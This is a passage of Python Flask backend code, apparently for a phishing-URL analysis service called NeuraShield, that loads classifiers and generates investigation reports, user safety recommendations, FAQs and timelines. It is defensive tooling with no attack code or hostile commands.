from flask import Flask, render_template, request, redirect, session, url_for, jsonify, has_request_context
from werkzeug.security import generate_password_hash, check_password_hash
import hmac
import secrets
import os
import sys
import sqlite3
import pandas as pd
from datetime import datetime
import shutil
import joblib
import hashlib
import json
import math
from collections import OrderedDict
import warnings

def sanitize_for_json(obj):
    """
    Recursively sanitize objects for strict RFC 8259 JSON compliance.
    Replaces float('nan'), np.nan, float('inf') with None so browsers never encounter SyntaxError: Unexpected token 'N'.
    """
    if isinstance(obj, float):
        if math.isnan(obj) or math.isinf(obj):
            return None
        return obj
    elif isinstance(obj, dict):
        return {k: sanitize_for_json(v) for k, v in obj.items()}
    elif isinstance(obj, (list, tuple, set)):
        return [sanitize_for_json(v) for v in obj]
    elif pd.isna(obj):
        return None
    return obj
try:
    from sklearn.exceptions import InconsistentVersionWarning
    warnings.filterwarnings("ignore", category=InconsistentVersionWarning)
except ImportError:
    pass

# Add project root to path for imports
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.append(project_root)
from model.feature_extraction import (
    extract_features, MODEL_FEATURE_KEYS, normalize_url,
    URL_FEATURE_SCHEMA_VERSION, MODULE_VERSION
)
from model.rule_engine import evaluate_security_rules
from model.domain_intelligence.collector import analyze_domain, normalize_domain_input, is_safe_target
from model.domain_intelligence.domain_rule_engine import evaluate_domain_rules
from model.domain_intelligence.domain_feature_extraction import extract_domain_features, features_to_vector
from model.domain_intelligence.risk_fusion import fuse_threat_layers, calculate_risk_level
from model.webpage_intelligence.fetcher import safe_fetch_webpage, safe_fetch_webpage_hybrid, FETCH_SUCCESS
from model.webpage_intelligence.analyzer import analyze_webpage
from model.webpage_intelligence.webpage_rule_engine import evaluate_webpage_rules
from model.webpage_intelligence.identity_consistency import evaluate_identity_consistency

frontend_path = os.path.join(project_root, 'frontend')
app = Flask(__name__, template_folder=frontend_path, static_folder=frontend_path, static_url_path='')
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.jinja_env.auto_reload = True
# Session signing key: from the environment, else a random key persisted next to the
# database (never a hard-coded constant). See docs/SECURITY_NOTES.md.
def _load_secret_key():
    env_key = os.environ.get("NEURASHIELD_SECRET_KEY")
    if env_key:
        return env_key
    key_dir = os.environ.get('DATABASE_DIR') or (os.path.dirname(__file__) if os.name == 'nt' else '/tmp')
    key_file = os.path.join(key_dir, '.neurashield_secret_key')
    try:
        if os.path.exists(key_file):
            with open(key_file) as fh:
                k = fh.read().strip()
                if len(k) >= 32:
                    return k
        k = secrets.token_hex(32)
        os.makedirs(key_dir, exist_ok=True)
        with open(key_file, 'w') as fh:
            fh.write(k)
        try:
            os.chmod(key_file, 0o600)
        except Exception:
            pass
        return k
    except Exception:
        return secrets.token_hex(32)

app.secret_key = _load_secret_key()
app.config.update(SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Lax")
# Opt-in only: the hard-coded ".demo" showcase responses in Webpage Intelligence are
# SIMULATED and are never returned unless this flag is explicitly set.
SIMULATED_DEMOS_ENABLED = os.environ.get("NEURASHIELD_SIMULATED_DEMOS") == "1"

# Copy user-provided logo to static/static/ns_logo.png so all pages can find it
def copy_logo():
    logo_candidates = [
        os.path.join(project_root, 'frontend', 'static', 'ns_logo.png'),
        os.path.join(project_root, 'ns_logo.png'),
    ]
    static_logo = os.path.join(project_root, 'frontend', 'static', 'ns_logo.png')
    for candidate in logo_candidates:
        if os.path.exists(candidate):
            if candidate != static_logo:
                shutil.copy2(candidate, static_logo)
            break

copy_logo()

# Database path for serverless environments
if os.name == 'nt':
    database_dir = os.path.dirname(__file__)
else:
    database_dir = os.environ.get('DATABASE_DIR', '/tmp')
os.makedirs(database_dir, exist_ok=True)

DATABASE_PATH = os.path.join(database_dir, 'database.db')


# ── Load Model ────────────────────────────────────────────────────────────────
try:
    model_path = os.path.join(project_root, 'model', 'phishing_model.pkl')
    print(f"Attempting to load model from: {model_path}")
    print(f"Model file exists: {os.path.exists(model_path)}")
    model = joblib.load(model_path)
    print("Model loaded successfully.")
except Exception as e:
    print(f"Error loading model: {e}")
    import traceback
    traceback.print_exc()
    model = None

# ── Load Domain Intelligence Model ───────────────────────────────────────────
domain_model = None
domain_model_schema = None
try:
    domain_model_path = os.path.join(project_root, 'model', 'domain_intelligence', 'domain_model.pkl')
    schema_path = os.path.join(project_root, 'model', 'domain_intelligence', 'feature_schema.json')
    if os.path.exists(domain_model_path):
        domain_model = joblib.load(domain_model_path)
        print(f"Loaded Domain Intelligence ML model from: {domain_model_path}")
    if os.path.exists(schema_path):
        with open(schema_path, 'r') as f:
            domain_model_schema = json.load(f)
except Exception as e:
    print(f"Domain model loading notice: {e}")

# ── In-Memory Domain Cache (TTL 1 hour) ───────────────────────────────────────
class DomainCache:
    """In-memory cache for live domain analysis results with TTL (default 1 hour)."""
    def __init__(self, ttl_seconds=3600, max_size=200):
        self._cache = {}
        self._ttl = ttl_seconds
        self._max = max_size

    def get(self, domain):
        if not domain:
            return None
        domain = domain.lower().strip()
        entry = self._cache.get(domain)
        if not entry:
            return None
        data, ts = entry
        if (datetime.now() - ts).total_seconds() > self._ttl:
            del self._cache[domain]
            return None
        return data

    def put(self, domain, data):
        if not domain:
            return
        domain = domain.lower().strip()
        if len(self._cache) >= self._max:
            oldest_key = min(self._cache.keys(), key=lambda k: self._cache[k][1])
            del self._cache[oldest_key]
        self._cache[domain] = (data, datetime.now())

domain_cache = DomainCache()

# ── In-Memory Investigation Store (LRU, last 50) ─────────────────────────────
class InvestigationStore:
    """Stores recent investigations so the Full Report page can retrieve them."""
    def __init__(self, max_size=50):
        self._store = OrderedDict()
        self._max = max_size

    def put(self, inv_id, data):
        if inv_id in self._store:
            self._store.move_to_end(inv_id)
        self._store[inv_id] = data
        while len(self._store) > self._max:
            self._store.popitem(last=False)

    def get(self, inv_id):
        return self._store.get(inv_id)

investigation_store = InvestigationStore()
_email_hooks = {}  # filled by register_email_routes (persistence helpers)


def _generate_investigation_id(url, timestamp):
    """Deterministic investigation ID from URL + timestamp."""
    h = hashlib.sha256(f"{url}|{timestamp}".encode()).hexdigest()[:8].upper()
    year = datetime.now().year
    return f"NS-INV-{year}-{h}"


def _generate_threat_dna(evidence_items, features, domain_intel=None, webpage_intel=None):
    """Evidence-derived fingerprint for cross-campaign correlation across URL, domain, and webpage layers."""
    parts = []
    for e in evidence_items[:6]:
        parts.append(e.get('signal', ''))
    parts.append(str(features.get('url_length', 0)))
    parts.append(str(features.get('domain_entropy', 0)))
    if domain_intel:
        reg = domain_intel.get('registration', {})
        ssl_info = domain_intel.get('ssl', {})
        ip_info = domain_intel.get('ip', {})
        if reg.get('registrar'): parts.append(str(reg['registrar'])[:12])
        if reg.get('domain_age_days') is not None: parts.append(f"AGE:{reg['domain_age_days']}")
        if ssl_info.get('certificate_issuer'): parts.append(str(ssl_info['certificate_issuer'])[:12])
        if ip_info.get('resolved_ipv4'): parts.append(str(ip_info['resolved_ipv4'][0]))
    if webpage_intel and webpage_intel.get('webpage_status') != 'UNAVAILABLE':
        form_data = webpage_intel.get('form_analysis') or {}
        script_data = webpage_intel.get('script_analysis') or {}
        if form_data.get('has_password_field'): parts.append('PWFORM')
        if form_data.get('has_cross_domain_action'): parts.append('XDOM')
        parts.append(f"FORMS:{form_data.get('form_count', 0)}")
        parts.append(f"SCRIPTS:{script_data.get('total_count', 0)}")
    elif webpage_intel and webpage_intel.get('webpage_status') == 'UNAVAILABLE':
        parts.append(f"WP:UNAVAILABLE:{webpage_intel.get('reason', 'FAILED')}")
    raw = '|'.join(parts)
    h = hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    return f"NS-{h[:4]}-{h[4:8]}-{h[8:12]}-{h[12:16]}"


def _generate_executive_brief(url, intelligence, features, prediction):
    """Generate human-readable investigation brief from actual evidence."""
    is_phishing = prediction and any(term in str(prediction).lower() for term in ('phishing', 'suspicious', 'risk', 'malicious'))
    composite = intelligence.get('composite_risk', 0)
    level = (intelligence.get('composite_level', 'LOW')).upper()
    evidence = intelligence.get('evidence', [])
    top_signals = intelligence.get('top_signals', [])
    structural = intelligence.get('structural', {})
    lexical = intelligence.get('lexical', {})
    limitations = intelligence.get('limitations', [])

    # What we found
    threat_evidence = [e for e in evidence if e.get('severity', '').lower() not in ('informational', 'info')]
    info_evidence = [e for e in evidence if e.get('severity', '').lower() in ('informational', 'info')]

    # What we found
    if features.get('is_localhost', 0):
        what_found = (
            "The analyzed target resolves to a local loopback / internal private network address (localhost / 127.0.0.1). "
            "Local loopback targets pose severe Server-Side Request Forgery (SSRF) and local service exposure risks and must not be treated as legitimate web destinations."
        )
    elif is_phishing and composite >= 70:
        what_found = (
            f"The analyzed URL exhibits multiple characteristics strongly associated with "
            f"phishing or deceptive activity. NeuraShield's analysis across structural, lexical, "
            f"rule-based, and machine learning layers identified converging risk signals."
        )
    elif is_phishing and composite >= 45:
        what_found = (
            f"The analyzed URL contains several structural and lexical patterns commonly "
            f"observed in suspicious or deceptive URLs. While no single signal is conclusive, "
            f"the combination of detected indicators warrants caution."
        )
    elif is_phishing:
        what_found = (
            f"The analyzed URL triggered threat detection, though the overall risk profile "
            f"is moderate. Some suspicious patterns were identified that merit careful evaluation."
        )
    elif len(info_evidence) > 0 and len(threat_evidence) == 0:
        what_found = (
            f"The analyzed target does not exhibit characteristics associated with phishing or deceptive activity. "
            f"{len(info_evidence)} routine infrastructure/lifecycle observation{'s were' if len(info_evidence) > 1 else ' was'} "
            f"cataloged for transparency without elevating the risk profile."
        )
    else:
        what_found = (
            f"The analyzed URL does not exhibit the primary characteristics typically associated "
            f"with phishing or deceptive activity based on URL-level analysis. The structural and "
            f"lexical patterns appear consistent with legitimate URL conventions."
        )

    # Why it matters
    if len(threat_evidence) >= 3:
        why_matters = (
            f"Multiple independent analysis layers ({len(threat_evidence)} evidence items) identified "
            f"risk indicators. When several detection methods agree, confidence in the assessment "
            f"increases. However, URL-level analysis alone cannot definitively confirm malicious intent."
        )
    elif len(threat_evidence) >= 1:
        why_matters = (
            f"NeuraShield identified {len(threat_evidence)} supporting evidence item(s). While individual "
            f"signals may appear in legitimate URLs, the specific combination and context observed "
            f"here contributed to the risk assessment."
        )
    elif len(info_evidence) >= 1:
        num_obs_word = "Two" if len(info_evidence) == 2 else ("One" if len(info_evidence) == 1 else str(len(info_evidence)))
        why_matters = (
            f"{num_obs_word} infrastructure/lifecycle observation{'s were' if len(info_evidence) > 1 else ' was'} "
            f"identified. These observations are not independently indicative of malicious activity."
        )
    else:
        why_matters = (
            "No significant risk indicators were detected at the URL intelligence level. "
            "The URL structure, encoding, and lexical patterns fall within expected ranges "
            "for legitimate web addresses."
        )

    # Evidence summary
    evidence_summary = []
    for e in evidence[:4]:
        evidence_summary.append(e.get('what', ''))

    # Limitations
    limitation_text = ""
    if limitations:
        limitation_text = (
            f"This investigation is based on URL-level intelligence only. "
            f"{limitations[0]} Additional context from future modules "
            f"(domain WHOIS, webpage content, email headers) would strengthen or refine this assessment."
        )

    # Next step
    if features.get('is_localhost', 0):
        next_step = (
            "Do not route external network requests to internal localhost or loopback destinations. "
            "Ensure services binding to 127.0.0.1 or localhost are isolated behind strict authentication."
        )
    elif is_phishing and composite >= 45:
        next_step = (
            "Do not enter credentials or personal information on this URL. "
            "If you need to access the service this URL claims to represent, "
            "navigate to the official website through an independently verified channel."
        )
    elif is_phishing:
        next_step = (
            "Exercise caution before interacting with this URL. Verify the destination "
            "through an independent trusted source before providing any information."
        )
    else:
        next_step = (
            "While no major risk indicators were detected, always verify that you are "
            "on the intended website before entering sensitive information."
        )

    # Headline verdict (MalwareTips Threat Lens lead sentence)
    sec_rules = intelligence.get('security_rules', {}).get('rules_hit', [])
    dom_rules = intelligence.get('domain_rules', {}).get('rules_hit', [])
    combined_rules = list(sec_rules) + list(dom_rules)
    threat_rules_hit = [r for r in combined_rules if (r.get('severity') or '').upper() not in ('INFORMATIONAL', 'INFO')]
    info_rules_hit = [r for r in combined_rules if (r.get('severity') or '').upper() in ('INFORMATIONAL', 'INFO')]

    if features.get('is_localhost', 0):
        headline_verdict = f"Target flagged as internal loopback destination (SSRF Risk) with high risk score ({composite}/100) — potential Server-Side Request Forgery vector."
    elif is_phishing and threat_rules_hit:
        primary_rule = threat_rules_hit[0].get('label') or threat_rules_hit[0].get('title', 'Security rule triggered')
        headline_verdict = f"Flagged by deterministic security rules ({len(threat_rules_hit)} rule{'s' if len(threat_rules_hit) > 1 else ''} matched) with {len(threat_evidence)} converging risk indicators — {primary_rule}."
    elif is_phishing:
        headline_verdict = f"URL classified as phishing with elevated composite threat score ({composite}/100) — {len(threat_evidence)} structural and lexical risk signals identified."
    elif len(info_rules_hit) > 0 and len(threat_rules_hit) == 0:
        headline_verdict = f"Authentic domain profile with standard operational metrics — {len(info_rules_hit)} infrastructure observation{'s' if len(info_rules_hit) > 1 else ''} recorded with zero malicious threat rules triggered."
    else:
        headline_verdict = f"Authentic URL profile with standard lexical metrics — zero deterministic security rules triggered and clean classifier consensus."

    # Evidence Anchors for the Threat Lens side-card
    evidence_anchors = []
    if evidence:
        for idx, e in enumerate(evidence[:3], 1):
            evidence_anchors.append({
                'num': f"0{idx}",
                'title': e.get('signal', 'Risk Indicator').replace('_', ' ').title(),
                'detail': e.get('what', ''),
                'severity': e.get('severity', 'medium'),
            })
    else:
        evidence_anchors = [
            {
                'num': '01',
                'title': 'Security Rule Engine',
                'detail': 'All 18 deterministic security rules evaluated cleanly without trigger.',
                'severity': 'low',
            },
            {
                'num': '02',
                'title': 'Lexical Entropy Profile',
                'detail': f'Calculated URL Shannon entropy ({features.get("url_entropy", 0)}) is within safe distribution.',
                'severity': 'low',
            },
            {
                'num': '03',
                'title': 'ML Consensus',
                'detail': 'Random Forest classifier inferred safe destination based on 40+ structural features.',
                'severity': 'low',
            }
        ]

    return {
        'what_found': what_found,
        'why_matters': why_matters,
        'evidence_summary': evidence_summary,
        'limitation': limitation_text,
        'next_step': next_step,
        'headline_verdict': headline_verdict,
        'evidence_anchors': evidence_anchors,
    }



def _generate_signal_explanations(evidence, features, rules_hit):
    """Generate detailed human-readable explanations for each significant signal."""
    explanations = []
    for e in evidence:
        expl = {
            'signal': e.get('signal', 'unknown'),
            'what_detected': e.get('what', ''),
            'where': e.get('where', ''),
            'what_it_means': e.get('why', ''),
            'why_it_matters': '',
            'evidence_strength': e.get('severity', 'medium').capitalize(),
            'risk_contribution': 'Contributing signal',
        }

        sev = e.get('severity', 'medium').lower()
        if sev == 'critical':
            expl['why_it_matters'] = (
                "This is a high-confidence indicator. It is strongly associated with deceptive "
                "or malicious URL construction techniques and significantly elevates the risk assessment."
            )
            expl['risk_contribution'] = 'Primary risk driver'
        elif sev == 'high':
            expl['why_it_matters'] = (
                "This indicator is frequently observed in phishing and social engineering campaigns. "
                "While it can occasionally appear in legitimate URLs, its presence warrants elevated scrutiny."
            )
            expl['risk_contribution'] = 'Significant contributor'
        elif sev == 'medium':
            expl['why_it_matters'] = (
                "This is a supporting signal that adds context to the overall assessment. "
                "By itself it would not be conclusive, but in combination with other indicators "
                "it strengthens the risk evaluation."
            )
            expl['risk_contribution'] = 'Supporting signal'
        elif sev in ('informational', 'info'):
            expl['why_it_matters'] = (
                "This is an infrastructure or lifecycle observation. It describes routine operational "
                "properties and does not independently indicate malicious activity (0% risk penalty)."
            )
            expl['risk_contribution'] = 'Neutral observation (0% risk contribution)'
        else:
            expl['why_it_matters'] = (
                "This is a low-severity observation that provides additional context. "
                "It does not independently indicate a threat but contributes to the overall profile."
            )
            expl['risk_contribution'] = 'Contextual indicator'

        explanations.append(expl)

    return explanations


def _generate_risk_fusion(intelligence):
    """Generate risk fusion breakdown showing how layers contributed."""
    domain_intel = intelligence.get('domain_intelligence')
    domain_rules = intelligence.get('domain_rules')
    domain_ml = intelligence.get('domain_ml')
    webpage_rules = intelligence.get('webpage_rules')
    return fuse_threat_layers(intelligence, domain_intel, domain_rules, domain_ml, webpage_rules)


def _generate_coverage(intelligence):
    """Generate analysis coverage report with strict existence validation."""
    has_domain = intelligence.get('domain_intelligence') is not None and intelligence.get('domain_intelligence', {}).get('overall_status') != 'failed'
    w_intel = intelligence.get('webpage_intelligence') or {}
    w_fetch = intelligence.get('webpage_fetch') or {}

    webpage_available = (
        w_intel.get('webpage_status') == 'AVAILABLE' or 
        (w_fetch.get('fetch_status') == 'FETCH_SUCCESS' and w_intel.get('status') == 'analyzed')
    )
    webpage_unavailable = (
        w_intel.get('webpage_status') == 'UNAVAILABLE' or 
        (w_fetch.get('fetch_status') and w_fetch.get('fetch_status') != 'FETCH_SUCCESS')
    )

    if webpage_available:
        wp_status = 'complete'
        wp_icon = '✓'
        wp_badge = 'Complete'
    elif webpage_unavailable:
        wp_status = 'reduced'
        wp_icon = '⚠'
        wp_badge = 'Reduced'
    else:
        wp_status = 'available'
        wp_icon = '—'
        wp_badge = 'Available'

    completed = 5 + (1 if has_domain else 0) + (1 if webpage_available else 0)
    coverage_level = 'Complete' if (has_domain and webpage_available) else 'Reduced'

    return {
        'coverage_level': coverage_level,
        'webpage_coverage': 'Reduced' if webpage_unavailable else ('Complete' if webpage_available else 'Not Run'),
        'capabilities': [
            {'name': 'URL Intelligence', 'status': 'complete', 'icon': '✓'},
            {'name': 'Structural Analysis', 'status': 'complete', 'icon': '✓'},
            {'name': 'Lexical Analysis', 'status': 'complete', 'icon': '✓'},
            {'name': 'Security Rule Engine', 'status': 'complete', 'icon': '✓'},
            {'name': 'ML Classification', 'status': 'complete', 'icon': '✓'},
            {'name': 'Domain Intelligence', 'status': 'complete' if has_domain else 'available', 'icon': '✓' if has_domain else '—'},
            {'name': 'Webpage Intelligence', 'status': wp_status, 'icon': wp_icon, 'badge': wp_badge, 'reason': w_fetch.get('fetch_status') or w_intel.get('reason')},
            {'name': 'Email Intelligence', 'status': 'not_applicable', 'icon': '—'},
        ],
        'completed': completed,
        'total_applicable': 8,
    }


def _generate_recommendations(intelligence, prediction, features):
    """Generate contextual recommendations based on actual findings."""
    is_phishing = prediction and 'phishing' in prediction.lower()
    composite = intelligence.get('composite_risk', 0)
    evidence = intelligence.get('evidence', [])
    lexical = intelligence.get('lexical', {})

    recs = []

    if is_phishing and composite >= 45:
        recs.append({
            'priority': 'critical',
            'action': 'Do not enter credentials or personal information.',
            'reason': 'Multiple analysis layers identified risk indicators associated with credential collection or deception.',
        })
        recs.append({
            'priority': 'high',
            'action': 'Do not provide payment information.',
            'reason': 'Suspicious URLs may attempt to collect financial data through imitation forms.',
        })

    if any(e.get('signal') == 'brand_impersonation' for e in evidence):
        brand = lexical.get('brand_list', [''])[0]
        recs.append({
            'priority': 'high',
            'action': f'Verify the organization through an independently known official website.',
            'reason': f'Brand similarity to "{brand}" was detected. Navigate to the official website directly rather than through this URL.',
        })

    if is_phishing:
        recs.append({
            'priority': 'medium',
            'action': 'Do not download files from this URL.',
            'reason': 'Suspicious URLs may serve malicious downloads disguised as legitimate content.',
        })
        recs.append({
            'priority': 'medium',
            'action': 'Preserve the URL and investigation evidence for reference.',
            'reason': 'If you need to report this URL, having the original link and investigation ID is helpful.',
        })
    else:
        recs.append({
            'priority': 'low',
            'action': 'Verify you are on the intended website before entering sensitive information.',
            'reason': 'Even URLs that pass automated checks should be verified, as URL-level analysis has inherent limitations.',
        })

    return recs


def _generate_interaction_guidance(intelligence, prediction):
    """Generate 'if you already interacted' decision tree."""
    is_phishing = prediction and 'phishing' in prediction.lower()
    composite = intelligence.get('composite_risk', 0)

    scenarios = [
        {
            'scenario': 'I only opened the page',
            'icon': '👁',
            'steps': [
                'Close the page and do not interact further.',
                'Clear your browser cache and cookies for that domain.',
                'Monitor for any unusual browser behavior or unexpected pop-ups.',
            ],
            'note': 'Simply viewing a page does not typically compromise your accounts, though it may expose your IP address and browser information to the site operator.',
        },
        {
            'scenario': 'I entered my password',
            'icon': '🔑',
            'steps': [
                'Change your password immediately through the legitimate service\'s official website.',
                'Enable multi-factor authentication (MFA) if available.',
                'Review recent account activity and active sessions.',
                'If the same password is used elsewhere, change it on those services as well.',
            ],
            'note': 'Entering credentials on a suspicious site means they may have been captured. Prompt password changes significantly reduce the risk of unauthorized access.',
        },
        {
            'scenario': 'I entered payment information',
            'icon': '💳',
            'steps': [
                'Contact your bank or card provider immediately.',
                'Request a card block or replacement if appropriate.',
                'Monitor transactions for unauthorized activity.',
                'Consider placing a fraud alert with your financial institution.',
            ],
            'note': 'Financial institutions have fraud departments that can act quickly to prevent unauthorized charges.',
        },
        {
            'scenario': 'I downloaded a file',
            'icon': '📥',
            'steps': [
                'Do not open or execute the downloaded file.',
                'Delete the file from your system.',
                'Run a security scan using your antivirus software.',
                'If you already executed the file, seek IT or security assistance.',
            ],
            'note': 'Downloaded files can contain malware. If you have not executed the file, deleting it removes the immediate risk.',
        },
    ]

    preamble = (
        "Interaction with a suspicious site does not by itself prove that "
        "your account or device was compromised. The appropriate response "
        "depends on what information or actions were provided."
    )

    return {
        'preamble': preamble,
        'scenarios': scenarios,
    }


def _generate_safety_faq(intelligence, prediction, features):
    """Generate investigation-specific FAQ."""
    is_phishing = prediction and 'phishing' in prediction.lower()
    composite = intelligence.get('composite_risk', 0)
    evidence = intelligence.get('evidence', [])
    lexical = intelligence.get('lexical', {})

    faqs = []

    if is_phishing:
        faqs.append({
            'q': 'Why is this URL considered suspicious?',
            'a': f"NeuraShield's analysis identified {len(evidence)} risk indicator(s) across multiple "
                 f"analysis layers. The combination of detected signals — including structural, lexical, "
                 f"and pattern-based analysis — contributed to a composite risk score of {composite}/100.",
        })
    else:
        faqs.append({
            'q': 'Why was this URL classified as legitimate?',
            'a': f"The URL's structural and lexical characteristics fall within expected patterns for "
                 f"legitimate web addresses. The ML classifier and rule engine did not identify "
                 f"significant risk indicators, resulting in a composite risk score of {composite}/100.",
        })

    faqs.append({
        'q': 'Does a high risk score mean the site is definitely malicious?',
        'a': "No. The risk score reflects the likelihood based on URL-level characteristics. "
             "Legitimate websites can occasionally receive elevated scores due to unusual URL structures, "
             "and malicious sites can sometimes have low scores if they closely mimic normal patterns. "
             "The score should be treated as an informed assessment, not absolute certainty.",
    })

    if any(e.get('signal') == 'brand_impersonation' for e in evidence):
        brand = lexical.get('brand_list', ['a known brand'])[0]
        faqs.append({
            'q': f'What does brand similarity to "{brand}" mean?',
            'a': f"NeuraShield detected that the URL's hostname contains the name '{brand}' but is not "
                 f"the official registered domain for that organization. This pattern is frequently used "
                 f"in phishing, but can also occur in legitimate partner sites, support pages, or fan sites. "
                 f"It is a supporting signal, not independent proof.",
        })

    faqs.append({
        'q': "What does the ML model actually detect?",
        'a': "NeuraShield uses a Random Forest classifier trained on URL-level features such as "
             "URL length, character distributions, presence of IP addresses, suspicious keywords, "
             "and encoding patterns. The model's output is a statistical prediction based on patterns "
             "learned from labeled examples — it does not inspect live webpage content or network behavior.",
    })

    faqs.append({
        'q': "Can a legitimate website receive a suspicious score?",
        'a': "Yes. URLs with unusual structures, long paths, multiple subdomains, or certain TLDs "
             "may receive elevated scores even if they are legitimate. This is why NeuraShield provides "
             "detailed evidence so you can evaluate the specific signals yourself.",
    })

    faqs.append({
        'q': "Why couldn't NeuraShield verify some information?",
        'a': "NeuraShield currently operates at the URL intelligence level (Module 1). "
             "Domain registration details (WHOIS), SSL certificates, live webpage content, "
             "and email header analysis require additional modules that are planned for future releases. "
             "These limitations are clearly documented in the report.",
    })

    faqs.append({
        'q': "What should I do if I already entered my password?",
        'a': "Change your password immediately through the official website of the service "
             "(not through the suspicious URL). Enable multi-factor authentication if available, "
             "and review your account's recent activity for unauthorized access.",
    })

    return faqs


def _generate_investigation_timeline(url, intelligence, features, prediction):
    """Generate chronological investigation stages with timestamps and domain infrastructure milestones."""
    from datetime import datetime, timedelta
    evidence = intelligence.get('evidence', [])
    structural = intelligence.get('structural', {})
    lexical = intelligence.get('lexical', {})
    ml = intelligence.get('ml_classifier', {})
    composite = intelligence.get('composite_risk', 0)
    level = (intelligence.get('composite_level', 'LOW')).upper()
    d_intel = intelligence.get('domain_intelligence')
    d_rules = intelligence.get('domain_rules', {})
    d_ml = intelligence.get('domain_ml', {})

    stages = []

    # Base timestamp derived from real analysis time
    base_ts_str = intelligence.get('metadata', {}).get('scan_timestamp') or (d_intel.get('analysis_timestamp') if d_intel else None)
    try:
        base_dt = datetime.fromisoformat(base_ts_str) if base_ts_str else datetime.now()
    except Exception:
        base_dt = datetime.now()

    sec_offset = 0

    def t_str(offset):
        return (base_dt + timedelta(seconds=offset)).strftime("%H:%M:%S")

    # Event 1: URL received & normalized
    stages.append({
        'step': 1,
        'time': t_str(sec_offset),
        'title': 'Target Received & URL Normalized',
        'description': f"Target URL parsed and normalized: {url[:80]}{'...' if len(url) > 80 else ''}",
        'status': 'complete',
    })
    sec_offset += 1

    # Event 2: Structural analysis
    struct_flags = structural.get('flags', [])
    desc = f"Structural decomposition identified {len(struct_flags)} observation(s): {struct_flags[0]}" if struct_flags else "Structural decomposition completed. Syntax conforms to standard URI specifications."
    stages.append({
        'step': 2,
        'time': t_str(sec_offset),
        'title': 'URL Structure & Lexical Decomposition',
        'description': desc,
        'status': 'complete',
    })
    sec_offset += 1

    # If domain intelligence is present, include the individual infrastructure milestones
    if d_intel and d_intel.get('overall_status') != 'failed':
        d_target = d_intel.get('target', {}).get('registered_domain') or d_intel.get('domain') or structural.get('domain')
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'Domain Extracted',
            'description': f"Hostname normalized and Public Suffix List verified: {d_target}",
            'status': 'complete',
        })
        sec_offset += 1

        dns_info = d_intel.get('dns', {})
        a_cnt = len(dns_info.get('a_records', []))
        mx_cnt = len(dns_info.get('mx_records', []))
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'DNS Resolution Completed',
            'description': f"Authoritative DNS queried: {a_cnt} IPv4 A record(s), {mx_cnt} MX mail exchanger(s). Status: {dns_info.get('collection_status', 'resolved').upper()}.",
            'status': 'complete' if dns_info.get('dns_resolution') else 'partial',
        })
        sec_offset += 1

        ip_info = d_intel.get('ip', {})
        provider = ip_info.get('infrastructure_provider') or ip_info.get('ptr_hostname') or 'Public Gateway'
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'IP Infrastructure Analyzed',
            'description': f"Routing pathway evaluated: {len(ip_info.get('resolved_ipv4', []))} active IP(s) via {provider}. SSRF policy verified.",
            'status': 'complete',
        })
        sec_offset += 1

        reg_info = d_intel.get('registration', {})
        if reg_info.get('collection_status') != 'error' and reg_info.get('domain_age_days') is not None:
            reg_desc = f"Registration telemetry collected: Created {reg_info.get('creation_date', 'N/A')[:10]} (Age: {reg_info.get('domain_age_days')} days). Registrar: {reg_info.get('registrar', 'Unavailable')}."
            reg_st = 'complete'
        else:
            reg_desc = "Registration telemetry restricted or unavailable by registry policy / timeout."
            reg_st = 'unavailable'
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'Registration Telemetry Collected',
            'description': reg_desc,
            'status': reg_st,
        })
        sec_offset += 1

        ssl_info = d_intel.get('ssl', {})
        if ssl_info.get('ssl_available'):
            ssl_desc = f"TLS handshake established: {ssl_info.get('tls_version', 'TLS')} cipher negotiated. Issuer: {ssl_info.get('certificate_issuer', 'Unknown')}. Status: {'VALID ✓' if ssl_info.get('ssl_valid') else 'UNTRUSTED ⚠'}."
            ssl_st = 'complete' if ssl_info.get('ssl_valid') else 'partial'
        else:
            ssl_desc = "Port 443 closed or refused TLS handshake."
            ssl_st = 'unavailable'
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'TLS Certificate Analyzed',
            'description': ssl_desc,
            'status': ssl_st,
        })
        sec_offset += 1

        d_rules_hit = d_rules.get('rules_hit', [])
        stages.append({
            'step': len(stages) + 1,
            'time': t_str(sec_offset),
            'title': 'Domain Security Rules Evaluated',
            'description': f"Deterministic domain heuristics evaluated: {len(d_rules_hit)} rule flag(s) triggered. Heuristic risk: {d_rules.get('risk_score', 0)}/100.",
            'status': 'complete',
        })
        sec_offset += 1

    # Security Rules & ML
    rules_count = intelligence.get('security_rules', {}).get('count', 0)
    method = ml.get('method', 'Random Forest ML')
    stages.append({
        'step': len(stages) + 1,
        'time': t_str(sec_offset),
        'title': 'ML Classification Completed',
        'description': f"{method} classified URL target as {prediction} with {ml.get('probability', 0)}% confidence.",
        'status': 'complete',
    })
    sec_offset += 1

    # Risk Fusion
    stages.append({
        'step': len(stages) + 1,
        'time': t_str(sec_offset),
        'title': 'Risk Fusion & Final Assessment',
        'description': f"Risk fusion synthesized across structural, lexical, domain infrastructure, and ML vectors. Composite score: {composite}/100 ({level}).",
        'status': 'complete',
    })

    return stages


def _generate_threat_relationship_graph(url, intelligence, domain_intel=None, webpage_intel=None):
    """Construct multi-layer threat correlation graph nodes and edges."""
    nodes = []
    edges = []

    domain_str = intelligence.get('structural', {}).get('domain', '') or url
    clean_url = url[:45] + ('...' if len(url) > 45 else '')

    # Core nodes
    nodes.append({'id': 'n_url', 'label': clean_url, 'type': 'url', 'risk': intelligence.get('composite_level', 'LOW')})
    nodes.append({'id': 'n_domain', 'label': domain_str, 'type': 'domain', 'risk': intelligence.get('composite_level', 'LOW')})
    edges.append({'from': 'n_url', 'to': 'n_domain', 'label': 'hosted_on'})

    if domain_intel:
        ip_info = domain_intel.get('ip', {})
        ips = ip_info.get('resolved_ipv4', [])
        for idx, ip in enumerate(ips[:3]):
            node_id = f"n_ip_{idx}"
            nodes.append({'id': node_id, 'label': ip, 'type': 'ip', 'risk': 'INFO'})
            edges.append({'from': 'n_domain', 'to': node_id, 'label': 'resolves_to'})

        ns_info = domain_intel.get('nameservers', {})
